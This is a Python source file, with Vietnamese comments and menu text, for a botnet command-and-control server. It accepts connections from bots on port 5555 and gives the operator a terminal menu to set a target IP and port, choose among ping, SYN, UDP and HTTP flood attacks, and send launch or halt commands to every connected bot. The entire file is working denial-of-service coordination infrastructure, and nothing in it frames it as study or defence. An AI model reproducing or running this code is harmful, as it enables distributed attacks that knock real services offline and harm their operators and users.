import socket
import threading
import time

# Khởi tạo trạng thái mặc định
cmd_code = "HOLD"
target_ip = "172.20.10.7"
target_port = "80"
attack_type = "PINGFLOOD"

# Biến toàn cục lưu chuỗi lệnh đồng bộ chuẩn ngay từ đầu
CURRENT_COMMAND = f"{target_ip}_{target_port}_{cmd_code}_{attack_type}_0"
connected_bots = 0
lock = threading.Lock()


def print_banner():
    print(r""" _  _ _               ⑤
| \ | | |__   ___  _ __  
|  \| | '_ \ / _ \| '_ \ /  |
| |\  | | | | (_) | | | | | |
|_| \_|_| |_|\___/|_| |_| |_|

                5
    """)


# Luồng menu điều khiển tương tác trên Terminal
def command_menu():
    global CURRENT_COMMAND, target_ip, target_port, attack_type, cmd_code

    time.sleep(1)  # Đợi banner in xong
    while True:
        print("\n================ MENU ĐIỀU KHIỂN C2 ================")
        print(f"[*] Trạng thái hiện tại: {CURRENT_COMMAND}")
        print("1. Đổi Target IP & Port")
        print("2. Chọn kiểu tấn công (PINGFLOOD / SYNFLOOD / UDPFLOOD / HTTPFLOOD)")
        print("3. KÍCH HOẠT TẤN CÔNG (LAUNCH)")
        print("4. DỪNG TẤN CÔNG (HALT / HOLD)")
        print("5. Xem số lượng Bot đang Online")
        print("0. Thoát C2 Server")
        print("====================================================")

        choice = input("Lựa chọn của bạn [0-5]: ").strip()

        if choice == "1":
            target_ip = (
                input(f"Nhập IP mục tiêu mới (Hiện tại: {target_ip}): ").strip()
                or target_ip
            )
            target_port = (
                input(
                    f"Nhập Port mục tiêu mới (Hiện tại: {target_port}): "
                ).strip()
                or target_port
            )

            CURRENT_COMMAND = (
                f"{target_ip}_{target_port}_{cmd_code}_{attack_type}_0"
            )
            print(f"[+] Đã cập nhật mục tiêu: {target_ip}:{target_port}")

        elif choice == "2":
            print("\n  a. PINGFLOOD")
            print("  b. SYNFLOOD")
            print("  c. UDPFLOOD")
            print("  d. HTTPFLOOD (Dành cho Load Balancer)")
            t_choice = input("Chọn kiểu (a/b/c/d): ").strip().lower()
            if t_choice == "a":
                attack_type = "PINGFLOOD"
            elif t_choice == "b":
                attack_type = "SYNFLOOD"
            elif t_choice == "c":
                attack_type = "UDPFLOOD"
            elif t_choice == "d":
                attack_type = "HTTPFLOOD"

            CURRENT_COMMAND = (
                f"{target_ip}_{target_port}_{cmd_code}_{attack_type}_0"
            )
            print(f"[+] Đã chọn kiểu tấn công: {attack_type}")

        elif choice == "3":
            cmd_code = "LAUNCH"
            CURRENT_COMMAND = (
                f"{target_ip}_{target_port}_{cmd_code}_{attack_type}_0"
            )
            print(f"\n[!!!] ĐÃ PHÁT LỆNH TẤN CÔNG: {CURRENT_COMMAND}")

        elif choice == "4":
            cmd_code = "HOLD"
            CURRENT_COMMAND = (
                f"{target_ip}_{target_port}_{cmd_code}_{attack_type}_0"
            )
            print(f"\n[*] ĐÃ PHÁT LỆNH DỪNG/CHỜ: {CURRENT_COMMAND}")

        elif choice == "5":
            with lock:
                print(f"\n[i] Số lượng Bot đang kết nối: {connected_bots}")

        elif choice == "0":
            print("[*] Đang đóng Server...")
            break


def handle_client(conn, addr):
    global connected_bots

    with lock:
        connected_bots += 1
        print(
            f"\n\033[92m[+] Bot Online!\033[0m {addr[0]}:{addr[1]} | Tổng Bots: {connected_bots}"
        )

    try:
        while True:
            data = conn.recv(1024)
            if not data:
                break

            # Gửi chuỗi lệnh mới nhất cho Bot
            conn.send(CURRENT_COMMAND.encode())
            time.sleep(1)

    except Exception:
        pass
    finally:
        with lock:
            connected_bots -= 1
            print(
                f"\n\033[91m[-] Bot Offline!\033[0m {addr[0]}:{addr[1]} | Còn lại: {connected_bots}"
            )
        conn.close()


def Main():
    print_banner()
    host = "0.0.0.0"
    port = 5555

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        s.bind((host, port))
        s.listen(50)
        print(f"[*] C2 Server đang lắng nghe trên cổng {port}...")
    except Exception as e:
        print(f"[!] Không thể mở port {port}: {e}")
        return

    # Khởi chạy luồng Menu giao diện người dùng
    menu_thread = threading.Thread(target=command_menu)
    menu_thread.daemon = True
    menu_thread.start()

    while True:
        try:
            conn, addr = s.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr))
            t.daemon = True
            t.start()
        except KeyboardInterrupt:
            break

    s.close()


if __name__ == "__main__":
    Main()
